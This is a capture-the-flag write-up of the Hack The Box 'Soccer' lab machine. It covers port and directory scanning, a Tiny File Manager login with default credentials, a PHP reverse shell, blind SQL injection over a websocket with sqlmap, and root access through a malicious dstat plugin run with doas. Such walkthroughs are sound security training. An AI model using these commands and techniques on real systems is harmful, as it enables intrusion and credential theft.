# easy - Soccer

# Table of Content

- [easy - Soccer](#easy---soccer)
- [Table of Content](#table-of-content)
- [Content](#content)
  - [Finding user flag](#finding-user-flag)
  - [Finding root flag](#finding-root-flag)

# Content

## Finding user flag

At first glance, a web page is found:

![simple web page](/i/2023-02-24_12-22.png)

Something interesting found during nmap scanning:

```.../content/infosec/htb» sudo nmap --open --min-rate 5000 -T4 -Pn -p- soccer.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-12 23:28 -04
Nmap scan report for soccer.htb (10.129.20.182)
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
Nmap done: 1 IP address (1 host up) scanned in 15.46 seconds
```

That 9091 port seems to have a vulnerability, while checking that I've got distracted with this enumeration:

```bash
» gobuster dir -w /usr/share/dirb/wordlists/big.txt -t 50 -u http://soccer.htb/ -b 403,404
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://soccer.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404,403
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/12 23:38:02 Starting gobuster in directory enumeration mode
===============================================================
/tiny                 (Status: 301) [Size: 178] [--> http://soccer.htb/tiny/]
Progress: 20387 / 20470 (99.59%)
===============================================================
2023/01/12 23:39:09 Finished
===============================================================
```

This tiny is a filemanager framework, the first page asks for a user & password, the default ones work!: https://github.com/prasathmani/tinyfilemanager

> Default username/password: **admin/admin@123** and **user/12345**.

![tiny filemanager](/i/2023-02-26_21-27.png)

A quick googling of **Tiny File Manager 2.4.3** lead me to this url: https://github.com/febinrev/tinyfilemanager-2.4.3-exploit

So I just need to upload a PHP Shell file. Most directories arent' writtable except this one: **Destination Folder: /var/www/html/tiny/uploads**

I was able to get a reverse shell with php:

```bash
~» sudo nc -lvvp 55555
[sudo] password for n0kt:
Listening on any address 55555
Connection from 10.129.170.56:43156
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 01:42:32 up 19 min,  0 users,  load average: 0.01, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

After looking around I've found this nginx config:

```bash
www-data@soccer:/etc/nginx$ cat sites-enabled/*
cat sites-enabled/*
server {
        listen 80;
        listen [::]:80;
        server_name 0.0.0.0;
        return 301 http://soccer.htb$request_uri;
}

server {
        listen 80;
        listen [::]:80;

        server_name soccer.htb;

        root /var/www/html;
        index index.html tinyfilemanager.php;

        location / {
               try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }

        location ~ /\.ht {
                deny all;
        }

}


server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```

I've ran same scannign than before:

```bash
» gobuster dir -w /usr/share/dirb/wordlists/big.txt -t 50 -u http://soc-player.soccer.htb/ -b 403,404
...

/Login                (Status: 200) [Size: 3307]
/check                (Status: 200) [Size: 31]
/css                  (Status: 301) [Size: 173] [--> /css/]
/img                  (Status: 301) [Size: 173] [--> /img/]
/js                   (Status: 301) [Size: 171] [--> /js/]
/login                (Status: 200) [Size: 3307]
/logout               (Status: 302) [Size: 23] [--> /]
/match                (Status: 200) [Size: 10078]
/signup               (Status: 200) [Size: 3741]
```

No other option to sign-up and login, after that we can see there is a websocket web interface which is vulnerable to Blind SQL Injection:

![ws vuln to blind sqli](/i/2023-02-26_22-05.png)

People recommended to follow this article where it is explained how to run `sqlmap` with a proxied websocket with python: https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

From the python proxy script I've just modified two lines:

1. `ws_server = "ws://soc-player.soccer.htb:9091"` websocker url
2. the data payload: `data = '{"id":"%s"}' % message`

Then I ran the python script and executed sqlmap:

```bash
» python proxy.py
» sqlmap -u "http://127.0.0.1:8081/?id=1" -p id --dbs 
...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys


» sqlmap -u "http://127.0.0.1:8081/?id=1" --dump -D soccer_db -T accounts
...
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
```

And got ssh access out of that info:

```bash
player@soccer:~$ id
uid=1001(player) gid=1001(player) groups=1001(player)
player@soccer:~$ ls
user.txt
```

## Finding root flag


No `sudo` issues found for escalations, but a suid classic issue:

```bash
player@soccer:~$ sudo -l
[sudo] password for player:
Sorry, user player may not run sudo on localhost.
player@soccer:~$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
...

player@soccer:~$ ls -ltra /usr/local/bin/doas
-rwsr-xr-x 1 root root 42224 Nov 17 09:09 /usr/local/bin/doas
```

Then write a simple dstat module:

```bash
player@soccer:~$ vim /usr/local/share/dstat/dstat_foo.py
player@soccer:~$ doas /usr/bin/dstat --foo
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player# id
uid=0(root) gid=0(root) groups=0(root)
```

The py content of dstat_foo.py is just:

```python
import os
os.system("bash -i")
```
